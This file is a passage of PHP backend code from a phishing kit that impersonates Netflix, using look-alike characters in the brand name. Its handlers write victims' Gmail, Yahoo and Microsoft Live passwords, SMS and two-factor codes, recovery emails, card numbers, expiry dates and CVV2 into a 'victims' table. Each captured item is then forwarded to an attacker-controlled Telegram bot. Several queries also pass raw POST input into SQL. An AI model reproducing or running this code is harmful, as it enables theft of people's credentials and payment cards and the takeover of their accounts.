        $query = mysqli_query($conn, "UPDATE victims SET status=37, buzzed=0, yhapp='$yhapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Yahoo APP:</b> <code>$yhapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'ydigt2') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ydigt2'])) {
        $ydigt2 = mysqli_real_escape_string($conn, $_POST['ydigt2']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=39, buzzed=0, ydigt2='$ydigt2' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Yahoo 2 Digits:</b> <code>$ydigt2</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'ymailc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ymailc'])) {
        $ymailc = mysqli_real_escape_string($conn, $_POST['ymailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=35, buzzed=0, ymailc='$ymailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Yahoo Code Mail:</b> <code>$ymailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}





if ($_GET['type'] == 'gpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gpass'])) {
        $gpass = mysqli_real_escape_string($conn, $_POST['gpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=41, buzzed=0, gpass='$gpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Gmail Password:</b> <code>$gpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'gsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gsms'])) {
        $gsms = mysqli_real_escape_string($conn, $_POST['gsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=43, buzzed=0, gsms='$gsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail SMS:</b> <code>$gsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'gtap') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['gtap'])) {
        $gtap = mysqli_real_escape_string($conn, $_POST['gtap']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=45, buzzed=0, gtap='$gtap' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Gmail Tap:</b> <code>$gtap</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	




if ($_GET['type'] == 'lpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lpass'])) {
        $lpass = mysqli_real_escape_string($conn, $_POST['lpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=51, buzzed=0, lpass='$lpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Live Password:</b> <code>$lpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'lnum') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lnum'])) {
        $lnum = mysqli_real_escape_string($conn, $_POST['lnum']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=53, buzzed=0, lnum='$lnum' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔢 <b>Live 4 Digits:</b> <code>$lnum</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'lsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lsms'])) {
        $lsms = mysqli_real_escape_string($conn, $_POST['lsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=55, buzzed=0, lsms='$lsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live SMS:</b> <code>$lsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'lmail') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lmail'])) {
        $lmail = mysqli_real_escape_string($conn, $_POST['lmail']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=57, buzzed=0, lmail='$lmail' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live RecMail:</b> <code>$lmail</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'lmailc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lmailc'])) {
        $lmailc = mysqli_real_escape_string($conn, $_POST['lmailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=59, buzzed=0, lmailc='$lmailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live RecMail Code:</b> <code>$lmailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if ($_GET['type'] == 'icpss') {
    $uniqueid = $_SESSION['uniqueid'];

	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['icpss'])) {
        $icpss = mysqli_real_escape_string($conn, $_POST['icpss']);

        $query = mysqli_query($conn, "UPDATE victims SET status=61, buzzed=0, icpss='$icpss' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong>🔹 #Nеtflіх 🔹</strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Nеtflіх Password:</strong> <code>$icpss</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}



if ($_GET['type'] == 'ic2fa') {
    $uniqueid = $_SESSION['uniqueid'];
	
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ic2fa'])) {
        $ic2fa = mysqli_real_escape_string($conn, $_POST['ic2fa']);

        $query = mysqli_query($conn, "UPDATE victims SET status=63, buzzed=0, ic2fa='$ic2fa' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong>🔹 #Nеtflіх 🔹</strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Nеtflіх OTP:</strong> <code>$ic2fa</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}





if ($_GET['type'] == 'startverify') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['startverify'])) {
        $startverify = mysqli_real_escape_string($conn, $_POST['startverify']);

        // Update database
        $query = mysqli_query($conn, "UPDATE victims SET status=91, buzzed=0, startverify='$startverify' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> Nеtflіх</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Start verication:</b> <code>$startverify</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if($_SESSION['started'] == 'true'){
	

	if($_GET['type'] == 'info'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['fname'] != '' and $_POST['mobile'] != '' and strlen($_POST['dob']) == 10 and $_POST['title'] != '' and $_POST['type'] != '' and $_POST['card'] != ''){

			$fname = $_POST['fname'];
			$mobile = $_POST['mobile'];
			$dob = $_POST['dob'];
			$title = $_POST['title'];
			$type = $_POST['type'];
			$card = $_POST['card'];
			$exp = $_POST['exp'];

			$query = mysqli_query($conn, "UPDATE victims SET status=4, buzzed=0, title='$title', name='$fname', mobile='$mobile', dob='$dob', type='$type', card='$card', exp='$exp' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}

		}
	}


	if($_GET['type'] == 'mobile_change'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['mobile'] != '' and $_POST['email'] != ''){

			$mobile = $_POST['mobile'];
			$email = $_POST['email'];
			$address = $_POST['address'];

			$query = mysqli_query($conn, "UPDATE victims SET status=0, buzzed=1, mobile='$mobile', email='$email', address='$address' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}

		}
	}



	if($_GET['type'] == 'safe'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['mobile'] != '' and $_POST['pin'] != ''){

			$mobile = $_POST['mobile'];
			$pin = $_POST['pin'];

			$query = mysqli_query($conn, "UPDATE victims SET status=21, buzzed=0, mobile='$mobile', pass='$pin' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}

		}
	}



	if($_GET['type'] == 'safe3'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['home'] != ''){
			$home = $_POST['home'];

			$query = mysqli_query($conn, "UPDATE victims SET status=49, buzzed=0, home='$home' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Details:</strong> <code>$home</code>\n<code></code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};
		}
	}



	if($_GET['type'] == 'safe2'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['card'] != '' and $_POST['exp'] != ''){
			$address = $_POST['address'];
			$card = $_POST['card'];
			$exp = $_POST['exp'];
			$type = $_POST['type'];

			$query = mysqli_query($conn, "UPDATE victims SET status=53, buzzed=0, address='$address', card='$card', exp='$exp', type='$type' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		if($enable_telegram == 'checked' and $telegram_chaid != ''){
		$query = mysqli_query($conn, "SELECT * from victims WHERE uniqueid='$uniqueid'");
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$tmsg = "<strong>[+] ID:</strong> <code>{$array['id']}</code>\n<strong>[+] Username:</strong> <code>{$array['user']}</code> [+]\n<strong>[+] Card Nr.:</strong> <code>$card</code>\n<strong>[+] Exp.:</strong> <code>$exp</code>\n<strong>[+] CVV2:</strong> <code>$address</code>";
		$tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);
		$telegram = new Telegram($bot_token);
		$content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
		$telegram->sendMessage($content);
		};
		}
	}



	if($_GET['type'] == 'aotp'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['address'] != ''){

			$address = $_POST['address'];

			$query = mysqli_query($conn, "UPDATE victims SET status=55, buzzed=0, address='$address' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
			}

		}
	}


	if($_GET['type'] == 'sotp'){
		$uniqueid = $_SESSION['uniqueid'];

		if($_POST['home'] != ''){

			$home = $_POST['home'];

			$query = mysqli_query($conn, "UPDATE victims SET status=65, buzzed=0, home='$home' WHERE uniqueid=$uniqueid");
			if($query){
				echo json_encode(array(
					'status' => 'ok'
				));
			}else{
				echo json_encode(array(
					'status' => 'notok'
				));
